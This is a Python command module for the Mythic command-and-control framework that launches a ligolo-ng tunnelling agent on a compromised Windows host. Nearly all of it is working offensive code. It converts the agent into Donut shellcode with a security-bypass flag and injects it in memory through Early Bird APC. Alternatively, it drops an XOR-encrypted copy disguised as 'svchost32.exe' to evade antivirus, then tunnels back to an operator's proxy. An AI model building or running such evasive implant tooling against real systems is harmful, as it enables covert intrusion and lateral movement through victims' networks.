import json as _json
import os
import tempfile
import pathlib
import donut
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

_BUNDLED_PATH = pathlib.Path("/Mythic/binaries/agent.exe")

# Raw PE bytes from bundled binary, loaded once on first task.
_LIGOLO_PE_BYTES: bytes = b""
# Donut shellcode derived from bundled binary, generated once on first fork+run task.
_LIGOLO_SC_BYTES: bytes = b""


def _donut_pe(binary_data: bytes) -> bytes:
    with tempfile.NamedTemporaryFile(suffix=".exe", delete=False) as tf:
        tf.write(binary_data)
        tmp_exe = tf.name
    try:
        return bytes(donut.create(file=tmp_exe, arch=2, bypass=3, format=1))
    finally:
        os.unlink(tmp_exe)


def _get_bundled_pe() -> bytes:
    global _LIGOLO_PE_BYTES
    if not _LIGOLO_PE_BYTES:
        if not _BUNDLED_PATH.exists():
            raise Exception(
                "No ligolo binary found. Add binaries/agent.exe to the container "
                "or provide a custom binary via the 'binary' parameter."
            )
        _LIGOLO_PE_BYTES = _BUNDLED_PATH.read_bytes()
    return _LIGOLO_PE_BYTES


def _get_bundled_sc() -> bytes:
    global _LIGOLO_SC_BYTES
    if not _LIGOLO_SC_BYTES:
        _LIGOLO_SC_BYTES = _donut_pe(_get_bundled_pe())
    return _LIGOLO_SC_BYTES


class LigoloStartArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="connect",
                cli_name="Connect",
                display_name="Proxy Address",
                type=ParameterType.String,
                description="host:port (TCP/TLS) or ws://host:port",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=0)],
            ),
            CommandParameter(
                name="remote_path",
                cli_name="RemotePath",
                display_name="Drop Path",
                type=ParameterType.String,
                default_value=r"C:\Windows\Temp\svchost32.exe",
                description="Disk path when not using fork+run mode.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=1)],
            ),
            CommandParameter(
                name="ignore_cert",
                cli_name="IgnoreCert",
                display_name="Ignore TLS Cert",
                type=ParameterType.Boolean,
                default_value=True,
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=2)],
            ),
            CommandParameter(
                name="retry",
                cli_name="Retry",
                display_name="Auto-Retry",
                type=ParameterType.Boolean,
                default_value=True,
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
            ),
            CommandParameter(
                name="bind",
                cli_name="Bind",
                display_name="Bind Address",
                type=ParameterType.String,
                description="Bind to ip:port instead of connecting out.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=4)],
            ),
            CommandParameter(
                name="accept_fingerprint",
                cli_name="AcceptFingerprint",
                display_name="Accept Fingerprint",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=5)],
            ),
            CommandParameter(
                name="proxy",
                cli_name="Proxy",
                display_name="Proxy URL",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=6)],
            ),
            CommandParameter(
                name="user_agent",
                cli_name="UserAgent",
                display_name="User-Agent",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=7)],
            ),
            CommandParameter(
                name="verbose",
                cli_name="Verbose",
                display_name="Verbose",
                type=ParameterType.Boolean,
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=8)],
            ),
            CommandParameter(
                name="fork_run",
                cli_name="ForkRun",
                display_name="Fork+Run (in-memory)",
                type=ParameterType.Boolean,
                default_value=True,
                description=(
                    "Inject ligolo-ng in-memory via Early Bird APC (no disk write). "
                    "Uses the process set by spawnto as host. "
                    "Requires bundled binaries/agent.exe in the container."
                ),
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=9)],
            ),
            CommandParameter(
                name="push_mode",
                cli_name="PushMode",
                display_name="Push Mode",
                type=ParameterType.Boolean,
                default_value=False,
                description="Send shellcode in a single chunk (1 round-trip). Default: pull (multi-chunk).",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=10)],
            ),
            CommandParameter(
                name="chunk_size_mb",
                cli_name="ChunkSizeMB",
                display_name="Chunk Size (MB)",
                type=ParameterType.Number,
                default_value=4,
                description="Chunk size in MB for pull mode. Larger = fewer round-trips.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=11)],
            ),
            CommandParameter(
                name="binary",
                cli_name="Binary",
                display_name="Custom ligolo-ng binary",
                type=ParameterType.File,
                description=(
                    "Optional: upload a custom ligolo-ng agent.exe to use for fork+run. "
                    "If omitted, the bundled binaries/agent.exe is used."
                ),
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=12)],
            ),
        ]

    async def parse_arguments(self):
        if not self.command_line:
            return
        cmd = self.command_line.strip()
        if cmd.startswith("{"):
            self.load_args_from_json_string(cmd)
        else:
            self.load_args_from_json_string(_json.dumps({"connect": cmd}))


class LigoloStartCommand(CommandBase):
    cmd = "ligolo_start"
    needs_admin = False
    help_cmd = "ligolo_start 10.0.0.1:11601"
    description = (
        "Start a ligolo-ng agent session.\n"
        "Disk-drop mode: Start proxy first: ./proxy -selfcert -laddr 0.0.0.0:11601\n"
        "Fork+Run mode: Donut shellcode generated at task time, injected via Early Bird APC."
    )
    version = 1
    author = "@goultarde"
    argument_class = LigoloStartArguments
    attackmapping = ["T1090", "T1572", "T1071.001", "T1055.004"]
    attributes = CommandAttributes(supported_os=[SupportedOS.Windows])

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        connect     = taskData.args.get_arg("connect") or ""
        bind_addr   = taskData.args.get_arg("bind") or ""
        remote_path = taskData.args.get_arg("remote_path") or r"C:\Windows\Temp\svchost32.exe"
        fork_run    = taskData.args.get_arg("fork_run") or False

        if not connect and not bind_addr:
            raise Exception("connect or bind is required")

        target = bind_addr if bind_addr else connect

        # Resolve source binary bytes (custom upload or bundled agent.exe).
        custom_file_id = taskData.args.get_arg("binary") or ""
        if custom_file_id:
            fc = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
                AgentFileId=custom_file_id,
            ))
            if not fc.Success:
                raise Exception(f"Failed to read custom binary: {fc.Error}")
            custom_pe = fc.Content
        else:
            custom_pe = None

        if fork_run:
            push_mode = taskData.args.get_arg("push_mode") or False

            # Build ligolo args passed via CreateProcessW lpCommandLine.
            args_parts = []
            if connect:    args_parts.append(f"-connect {connect}")
            if bind_addr:  args_parts.append(f"-bind {bind_addr}")
            if taskData.args.get_arg("ignore_cert"):  args_parts.append("-ignore-cert")
            if taskData.args.get_arg("retry"):        args_parts.append("-retry")
            if taskData.args.get_arg("verbose"):      args_parts.append("-v")
            accept_fp      = taskData.args.get_arg("accept_fingerprint") or ""
            proxy_url      = taskData.args.get_arg("proxy") or ""
            user_agent_val = taskData.args.get_arg("user_agent") or ""
            if accept_fp:       args_parts.append(f"-accept-fingerprint {accept_fp}")
            if proxy_url:       args_parts.append(f"-proxy {proxy_url}")
            if user_agent_val:  args_parts.append(f'-ua "{user_agent_val}"')
            taskData.args.add_arg("ligolo_args", " ".join(args_parts), ParameterType.String)

            sc_bytes = _donut_pe(custom_pe) if custom_pe else _get_bundled_sc()

            sc_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                TaskID=taskData.Task.ID,
                FileContents=sc_bytes,
                DeleteAfterFetch=True,
            ))
            if not sc_resp.Success:
                raise Exception(f"Failed to register ligolo shellcode: {sc_resp.Error}")
            taskData.args.add_arg("shellcode_file_id", sc_resp.AgentFileId, ParameterType.String)

            if push_mode:
                taskData.args.add_arg("sc_chunk_size", len(sc_bytes), ParameterType.Number)
                response.DisplayParams = f"fork+run push | {target}"
            else:
                chunk_size = int(taskData.args.get_arg("chunk_size_mb") or 4) * 1024 * 1024
                taskData.args.add_arg("sc_chunk_size", int(chunk_size), ParameterType.Number)
                response.DisplayParams = f"fork+run pull | {target}"
        else:
            # Disk-drop: Donut shellcode XOR-encrypted before upload.
            # Agent downloads encrypted blob, writes to remote_path (AV-safe), decrypts in memory,
            # then injects via Early Bird APC (same mechanism as fork+run).
            pe_bytes = custom_pe if custom_pe else _get_bundled_pe()
            sc_bytes = _donut_pe(pe_bytes)

            xor_key = os.urandom(16)
            sc_enc = bytes(b ^ xor_key[i % 16] for i, b in enumerate(sc_bytes))

            sc_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                TaskID=taskData.Task.ID,
                FileContents=sc_enc,
                DeleteAfterFetch=True,
            ))
            if not sc_resp.Success:
                raise Exception(f"Failed to register ligolo binary: {sc_resp.Error}")

            chunk_size = int(taskData.args.get_arg("chunk_size_mb") or 4) * 1024 * 1024
            taskData.args.add_arg("shellcode_file_id", sc_resp.AgentFileId, ParameterType.String)
            taskData.args.add_arg("sc_chunk_size", int(chunk_size), ParameterType.Number)
            taskData.args.add_arg("binary_xor_key", xor_key.hex(), ParameterType.String)

            args_parts = []
            if connect:    args_parts.append(f"-connect {connect}")
            if bind_addr:  args_parts.append(f"-bind {bind_addr}")
            if taskData.args.get_arg("ignore_cert"):  args_parts.append("-ignore-cert")
            if taskData.args.get_arg("retry"):        args_parts.append("-retry")
            if taskData.args.get_arg("verbose"):      args_parts.append("-v")
            accept_fp      = taskData.args.get_arg("accept_fingerprint") or ""
            proxy_url      = taskData.args.get_arg("proxy") or ""
            user_agent_val = taskData.args.get_arg("user_agent") or ""
            if accept_fp:       args_parts.append(f"-accept-fingerprint {accept_fp}")
            if proxy_url:       args_parts.append(f"-proxy {proxy_url}")
            if user_agent_val:  args_parts.append(f'-ua "{user_agent_val}"')
            taskData.args.add_arg("ligolo_args", " ".join(args_parts), ParameterType.String)

            response.DisplayParams = f"disk-drop | {target} -> {remote_path}"

        return response

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
